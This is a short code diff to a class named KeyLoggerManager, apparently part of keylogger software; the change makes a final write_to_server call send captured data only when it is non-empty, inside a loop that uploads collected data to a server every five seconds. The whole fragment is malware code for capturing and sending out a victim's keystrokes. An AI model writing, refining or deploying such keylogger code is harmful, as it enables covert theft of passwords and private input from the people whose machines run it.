@@ -71,7 +71,10 @@ class KeyLoggerManager:
                 data = self.__instance.data
                 writer.write_to_server(data)
             time.sleep(5)
-        writer.write_to_server(self.__instance.data)
+
+        data = self.__instance.data
+        if data:
+            writer.write_to_server(data)
 
 
     def check_status(self):
